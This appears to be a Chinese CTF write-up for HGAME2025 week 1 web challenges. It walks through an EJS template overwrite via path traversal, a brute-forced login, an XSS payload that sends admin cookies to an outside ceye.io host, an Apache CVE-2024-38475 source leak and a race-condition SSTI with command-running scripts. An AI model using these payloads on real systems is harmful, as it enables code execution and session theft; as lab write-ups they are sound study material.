[{"content":"Web week1 Level 24 Pacman 拿到环境\n一个小游戏，猜测应该是js审计\n查看index.js发现代码进行了混淆\n可以用工具反混淆一下，增加一下可读性\nhttps://tool.yuanrenxue.cn/decode_obfuscator\n反混淆之后找到这个\n感觉是栅栏，解密拿到flag\nLevel 47 BandBomb 文件上传\n附件有源码\n1const express = require(\u0026#39;express\u0026#39;); 2const multer = require(\u0026#39;multer\u0026#39;); 3const fs = require(\u0026#39;fs\u0026#39;); 4const path = require(\u0026#39;path\u0026#39;); 5 6const app = express(); 7 8app.set(\u0026#39;view engine\u0026#39;, \u0026#39;ejs\u0026#39;); 9 10app.use(\u0026#39;/static\u0026#39;, express.static(path.join(__dirname, \u0026#39;public\u0026#39;))); 11app.use(express.json()); 12 13const storage = multer.diskStorage({ 14 destination: (req, file, cb) =\u0026gt; { 15 const uploadDir = \u0026#39;uploads\u0026#39;; 16 if (!fs.existsSync(uploadDir)) { 17 fs.mkdirSync(uploadDir); 18 } 19 cb(null, uploadDir); 20 }, 21 filename: (req, file, cb) =\u0026gt; { 22 cb(null, file.originalname); 23 } 24}); 25 26const upload = multer({ 27 storage: storage, 28 fileFilter: (_, file, cb) =\u0026gt; { 29 try { 30 if (!file.originalname) { 31 return cb(new Error(\u0026#39;无效的文件名\u0026#39;), false); 32 } 33 cb(null, true); 34 } catch (err) { 35 cb(new Error(\u0026#39;文件处理错误\u0026#39;), false); 36 } 37 } 38}); 39 40app.get(\u0026#39;/\u0026#39;, (req, res) =\u0026gt; { 41 const uploadsDir = path.join(__dirname, \u0026#39;uploads\u0026#39;); 42 43 if (!fs.existsSync(uploadsDir)) { 44 fs.mkdirSync(uploadsDir); 45 } 46 47 fs.readdir(uploadsDir, (err, files) =\u0026gt; { 48 if (err) { 49 return res.status(500).render(\u0026#39;mortis\u0026#39;, { files: [] }); 50 } 51 res.render(\u0026#39;mortis\u0026#39;, { files: files }); 52 }); 53}); 54 55app.post(\u0026#39;/upload\u0026#39;, (req, res) =\u0026gt; { 56 upload.single(\u0026#39;file\u0026#39;)(req, res, (err) =\u0026gt; { 57 if (err) { 58 return res.status(400).json({ error: err.message }); 59 } 60 if (!req.file) { 61 return res.status(400).json({ error: \u0026#39;没有选择文件\u0026#39; }); 62 } 63 res.json({ 64 message: \u0026#39;文件上传成功\u0026#39;, 65 filename: req.file.filename 66 }); 67 }); 68}); 69 70app.post(\u0026#39;/rename\u0026#39;, (req, res) =\u0026gt; { 71 const { oldName, newName } = req.body; 72 const oldPath = path.join(__dirname, \u0026#39;uploads\u0026#39;, oldName); 73 const newPath = path.join(__dirname, \u0026#39;uploads\u0026#39;, newName); 74 75 if (!oldName || !newName) { 76 return res.status(400).json({ error: \u0026#39; \u0026#39; }); 77 } 78 79 fs.rename(oldPath, newPath, (err) =\u0026gt; { 80 if (err) { 81 return res.status(500).json({ error: \u0026#39; \u0026#39; + err.message }); 82 } 83 res.json({ message: \u0026#39; \u0026#39; }); 84 }); 85}); 86 87app.listen(port, () =\u0026gt; { 88 console.log(`服务器运行在 http://localhost:${port}`); 89}); 这题有点像24国赛的ezjs\n文章 - 对ejs引擎漏洞及函数特性的利用 - 先知社区\n可以看到在 /rename 路由\n1app.post(\u0026#39;/rename\u0026#39;, (req, res) =\u0026gt; { 2 const { oldName, newName } = req.body; 3 const oldPath = path.join(__dirname, \u0026#39;uploads\u0026#39;, oldName); 4 const newPath = path.join(__dirname, \u0026#39;uploads\u0026#39;, newName); 5 6 if (!oldName || !newName) { 7 return res.status(400).json({ error: \u0026#39; \u0026#39; }); 8 } 9 10 fs.rename(oldPath, newPath, (err) =\u0026gt; { 11 if (err) { 12 return res.status(500).json({ error: \u0026#39; \u0026#39; + err.message }); 13 } 14 res.json({ message: \u0026#39; \u0026#39; }); 15 }); 16}); 这个路由会将uploads目录中的文件重命名\n我们可以利用这个路由，通过目录穿越对任意文件进行移动和重命名\n也就是说我们可以通过上传恶意的ejs到uploads目录，接着通过/rename路由将我们上传的恶意ejs文件覆写掉/路由的模板文件mortis.ejs实现RCE\neval.ejs\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div\u0026gt; \u0026lt;%= process.mainModule.require(\u0026#39;child_process\u0026#39;).execSync(\u0026#39;whoami\u0026#39;) %\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 将ejs上传\n覆写原来的ejs\n访问/\n这题flag藏在环境变量里\npayload:\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div\u0026gt; \u0026lt;%= process.mainModule.require(\u0026#39;child_process\u0026#39;).execSync(\u0026#39;printenv\u0026#39;) %\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Level 69 MysteryMessageBoard 密码爆破，XSS cookie窃取\n爆出来 shallot/888888\n登进去看到一个留言板\n猜测是xss，测试一下\n\u0026lt;script\u0026gt;alert(\u0026#39;XSS\u0026#39;)\u0026lt;/script\u0026gt; 同时通过dirsearch扫到了/admin路由\n根据这句话大概可以猜到，访问/admin路由的时候应该会在后端以admin的身份来访问留言板\n也就是说我们可以进行cookie窃取\npayload:\n\u0026lt;script\u0026gt;document.location=\u0026#39;http://dfny33.ceye.io?\u0026#39;+document.cookie;\u0026lt;/script\u0026gt; 将payload输出在留言板，然后访问/admin\n成功拿到admin的cookie\n拿admin的cookie访问/flag即可拿到flag\nLevel 25 双面人派对 这道题有两个环境，一开始以为是re，其实感觉更像是misc\n访问app.service-web可以拿到一个main文件\n是一个elf文件\n用exeinfo PE查到用upx加壳了\n用upx官方工具就可以脱壳\nhttps://github.com/upx/upx/releases/latest\n脱壳之后用ida打开\n可以找到一段关于minio的密钥信息\n.noptrdata:0000000000D614E0\t000000AA\tC\tminio:\\r\\n endpoint: \\\u0026#34;127.0.0.1:9000\\\u0026#34;\\r\\n access_key: \\\u0026#34;minio_admin\\\u0026#34;\\r\\n secret_key: \\\u0026#34;JPSQ4NOBvh2/W7hzdLyRYLDm0wNRMG48BL09yOKGpHs=\\\u0026#34;\\r\\n bucket: \\\u0026#34;prodbucket\\\u0026#34;\\r\\n key: \\\u0026#34;update\\\u0026#34; 那我们大概就能猜到另一个环境应该就是这个minio的服务\n用mc通过Access Key和Secret Key连接上去\n里面有两个储存桶\n将两个储存桶都下载下来\n/hints里面放的是8080服务的源码，/prodbucket里面是源码编译后的文件叫做update，猜测是热更新\n看一下源码\n1package main 2 3import ( 4\t\u0026#34;level25/fetch\u0026#34; 5\t\u0026#34;level25/conf\u0026#34; 6\t\u0026#34;github.com/gin-gonic/gin\u0026#34; 7\t\u0026#34;github.com/jpillora/overseer\u0026#34; 8) 9 10func main() { 11\tfetcher := \u0026amp;fetch.MinioFetcher{ 12\tBucket: conf.MinioBucket, 13\tKey: conf.MinioKey, 14\tEndpoint: conf.MinioEndpoint, 15\tAccessKey: conf.MinioAccessKey, 16\tSecretKey: conf.MinioSecretKey, 17\t} 18\toverseer.Run(overseer.Config{ 19\tProgram: program, 20\tFetcher: fetcher, 21\t}) 22 23} 24 25func program(state overseer.State) { 26\tg := gin.Default() 27\tg.StaticFS(\u0026#34;/\u0026#34;, gin.Dir(\u0026#34;.\u0026#34;, true)) 28\tg.Run(\u0026#34;:8080\u0026#34;) 29} 我们可以猜测/路由展示的这个.目录就是前面我们下周main文件的目录\n我们可以把.改成根目录/，然后将编译后的源码覆写掉原来的update，热更新后，我们就能直接访问根目录了\npayload:\npackage main import ( \u0026#34;level25/fetch\u0026#34; \u0026#34;level25/conf\u0026#34; \u0026#34;github.com/gin-gonic/gin\u0026#34; \u0026#34;github.com/jpillora/overseer\u0026#34; ) func main() { fetcher := \u0026amp;fetch.MinioFetcher{ Bucket: conf.MinioBucket, Key: conf.MinioKey, Endpoint: conf.MinioEndpoint, AccessKey: conf.MinioAccessKey, SecretKey: conf.MinioSecretKey, } overseer.Run(overseer.Config{ Program: program, Fetcher: fetcher, }) } func program(state overseer.State) { g := gin.Default() g.StaticFS(\u0026#34;/abc\u0026#34;, gin.Dir(\u0026#34;/\u0026#34;, true)) g.Run(\u0026#34;:8080\u0026#34;) } 这里我将/路由改成了/abc，因为不知道为啥我用/路由不行\n将源码编译后覆写到储存桶上\n访问/abc\n拿到flag\nLevel 38475 角落 ssti/条件竞争\n/robots.txt有个/app.conf\n访问/app.conf\n这里展示了httpd.conf的片段\n这里给出了源码的位置还有一个重写引擎的规则，猜测应该是该版本的apache存在源码泄露\n同时在响应标头能找到Apache的版本信息\n可以找到这个版本的apache存在源码泄露，而且是跟重写规则有关\nCVE-2024-38475\n网上没找到什么poc\n但是可以找到漏洞发现者的一篇文章\nhttps://blog.orange.tw/posts/2024-08-confusion-attacks-en/\n根据这篇文章我们可以构造出paylaod\nhttp://node1.hgame.vidar.club:31155/admin/usr/local/apache2/app/app.py%3F 这道题多了一个RewriteCond \u0026ldquo;%{HTTP_USER_AGENT}\u0026rdquo; \u0026ldquo;^L1nk/\u0026rdquo;，只需要在user-agent前面加上L1nk/即可\n拿到源码\n1from flask import Flask, request, render_template, render_template_string, redirect 2import os 3import templates 4 5app = Flask(__name__) 6pwd = os.path.dirname(__file__) 7show_msg = templates.show_msg 8 9 10def readmsg(): 11\tfilename = pwd + \u0026#34;/tmp/message.txt\u0026#34; 12\tif os.path.exists(filename): 13\tf = open(filename, \u0026#39;r\u0026#39;) 14\tmessage = f.read() 15\tf.close() 16\treturn message 17\telse: 18\treturn \u0026#39;No message now.\u0026#39; 19 20 21@app.route(\u0026#39;/index\u0026#39;, methods=[\u0026#39;GET\u0026#39;]) 22def index(): 23\tstatus = request.args.get(\u0026#39;status\u0026#39;) 24\tif status is None: 25\tstatus = \u0026#39;\u0026#39; 26\treturn render_template(\u0026#34;index.html\u0026#34;, status=status) 27 28 29@app.route(\u0026#39;/send\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) 30def write_message(): 31\tfilename = pwd + \u0026#34;/tmp/message.txt\u0026#34; 32\tmessage = request.form[\u0026#39;message\u0026#39;] 33 34\tf = open(filename, \u0026#39;w\u0026#39;) 35\tf.write(message) 36\tf.close() 37 38\treturn redirect(\u0026#39;index?status=Send successfully!!\u0026#39;) 39\t40@app.route(\u0026#39;/read\u0026#39;, methods=[\u0026#39;GET\u0026#39;]) 41def read_message(): 42\tif \u0026#34;{\u0026#34; not in readmsg(): 43\tshow = show_msg.replace(\u0026#34;{{message}}\u0026#34;, readmsg()) 44\treturn render_template_string(show) 45\treturn \u0026#39;waf!!\u0026#39; 46\t47 48if __name__ == \u0026#39;__main__\u0026#39;: 49\tapp.run(host = \u0026#39;0.0.0.0\u0026#39;, port = 5000) 可以看到/read路由存在ssti，但是他waf掉了最重要的{\n但是可以看到这个/send路由会将传入的信息写入message.txt文件，在访问/read路由的时候则会读取message.txt文件。这么一来我们就可以考虑通过竞争的方式来绕过waf了。竞争思路大概就是我在很短的时间内连续发送两条信息，第一条信息是合法信息，而第二条信息是不合法的，那么就会存在一种情况，当第一条信息通过了判断，接下来要将文件的内容插入到模板中渲染的时候，刚好第二条不合法的信息覆写了message.txt，那么插入模板中的就是第二条不合法的信息了\n接下来就是搓脚本发包\n三个脚本\npoc1\n1import requests 2while True: 3 burp0_url = \u0026#34;http://node1.hgame.vidar.club:30762/app/send\u0026#34; 4 burp0_headers = {\u0026#34;Cache-Control\u0026#34;: \u0026#34;max-age=0\u0026#34;, \u0026#34;Accept-Language\u0026#34;: \u0026#34;zh-CN,zh;q=0.9\u0026#34;, \u0026#34;Origin\u0026#34;: \u0026#34;http://node1.hgame.vidar.club:30762\u0026#34;, \u0026#34;Content-Type\u0026#34;: \u0026#34;application/x-www-form-urlencoded\u0026#34;, \u0026#34;Upgrade-Insecure-Requests\u0026#34;: \u0026#34;1\u0026#34;, \u0026#34;User-Agent\u0026#34;: \u0026#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36\u0026#34;, \u0026#34;Accept\u0026#34;: \u0026#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\u0026#34;, \u0026#34;Referer\u0026#34;: \u0026#34;http://node1.hgame.vidar.club:30762/app/index\u0026#34;, \u0026#34;Accept-Encoding\u0026#34;: \u0026#34;gzip, deflate, br\u0026#34;, \u0026#34;Connection\u0026#34;: \u0026#34;keep-alive\u0026#34;} 5 burp0_data = {\u0026#34;message\u0026#34;: \u0026#34;{{config.__class__.__init__.__globals__[\u0026#39;os\u0026#39;].popen(\u0026#39;cat /flag\u0026#39;).read()}}\u0026#34;} 6 res = requests.post(burp0_url, headers=burp0_headers, data=burp0_data) 7 print(res.status_code) 8 poc2\n1import requests 2while True: 3 burp0_url = \u0026#34;http://node1.hgame.vidar.club:30762/app/send\u0026#34; 4 burp0_headers = {\u0026#34;Cache-Control\u0026#34;: \u0026#34;max-age=0\u0026#34;, \u0026#34;Accept-Language\u0026#34;: \u0026#34;zh-CN,zh;q=0.9\u0026#34;, \u0026#34;Origin\u0026#34;: \u0026#34;http://node1.hgame.vidar.club:30762\u0026#34;, \u0026#34;Content-Type\u0026#34;: \u0026#34;application/x-www-form-urlencoded\u0026#34;, \u0026#34;Upgrade-Insecure-Requests\u0026#34;: \u0026#34;1\u0026#34;, \u0026#34;User-Agent\u0026#34;: \u0026#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36\u0026#34;, \u0026#34;Accept\u0026#34;: \u0026#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\u0026#34;, \u0026#34;Referer\u0026#34;: \u0026#34;http://node1.hgame.vidar.club:30762/app/index\u0026#34;, \u0026#34;Accept-Encoding\u0026#34;: \u0026#34;gzip, deflate, br\u0026#34;, \u0026#34;Connection\u0026#34;: \u0026#34;keep-alive\u0026#34;} 5 burp0_data = {\u0026#34;message\u0026#34;: \u0026#34;123\u0026#34;} 6 res = requests.post(burp0_url, headers=burp0_headers, data=burp0_data) 7 print(res.status_code) poc3\n1import requests 2while True: 3 burp0_url = \u0026#34;http://node1.hgame.vidar.club:30762/app/read\u0026#34; 4 burp0_headers = {\u0026#34;Accept-Language\u0026#34;: \u0026#34;zh-CN,zh;q=0.9\u0026#34;, \u0026#34;Upgrade-Insecure-Requests\u0026#34;: \u0026#34;1\u0026#34;, \u0026#34;User-Agent\u0026#34;: \u0026#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36\u0026#34;, \u0026#34;Accept\u0026#34;: \u0026#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\u0026#34;, \u0026#34;Accept-Encoding\u0026#34;: \u0026#34;gzip, deflate, br\u0026#34;, \u0026#34;Connection\u0026#34;: \u0026#34;keep-alive\u0026#34;} 5 res = requests.get(burp0_url, headers=burp0_headers) 6 # print(res.text) 7 if \u0026#34;hgame\u0026#34; in (res.text): 8 print(res.text) 9 break 成功执行，拿到flag\n","permalink":"http://localhost:1313/post/hgame2025-week1/","summary":"\u003ch2 id=\"web\"\u003eWeb\u003c/h2\u003e\n\u003ch3 id=\"week1\"\u003eweek1\u003c/h3\u003e\n\u003ch3 id=\"level-24-pacman\"\u003eLevel 24 Pacman\u003c/h3\u003e\n\u003cp\u003e拿到环境\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250206151704506\" loading=\"lazy\" src=\"./assets/image-20250206151704506.png\"\u003e\u003c/p\u003e\n\u003cp\u003e一个小游戏，猜测应该是js审计\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250206151846623\" loading=\"lazy\" src=\"./assets/image-20250206151846623.png\"\u003e\u003c/p\u003e\n\u003cp\u003e查看index.js发现代码进行了混淆\u003c/p\u003e\n\u003cp\u003e可以用工具反混淆一下，增加一下可读性\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://tool.yuanrenxue.cn/decode_obfuscator\"\u003ehttps://tool.yuanrenxue.cn/decode_obfuscator\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250206152531656\" loading=\"lazy\" src=\"./assets/image-20250206152531656.png\"\u003e\u003c/p\u003e\n\u003cp\u003e反混淆之后找到这个\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250206152608227\" loading=\"lazy\" src=\"./assets/image-20250206152608227.png\"\u003e\u003c/p\u003e","title":"HGAME2025 WEEK1"},{"content":"","permalink":"http://localhost:1313/about/","summary":"about","title":"关于"}]